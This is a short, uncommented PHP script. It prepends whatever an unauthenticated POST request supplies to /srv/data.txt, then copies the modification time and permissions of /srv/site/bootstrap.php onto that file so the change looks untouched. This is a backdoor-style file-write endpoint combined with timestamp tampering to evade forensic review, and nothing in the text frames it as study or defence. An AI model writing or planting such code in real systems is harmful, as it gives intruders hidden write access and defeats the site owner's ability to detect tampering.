<?php
$target = '/srv/site/bootstrap.php';
$before = filemtime($target);
$mode = fileperms($target);
$target = '/srv/data.txt';
file_put_contents($target, $_POST['body'] . file_get_contents($target));
touch($target, $before);
chmod($target, $mode);
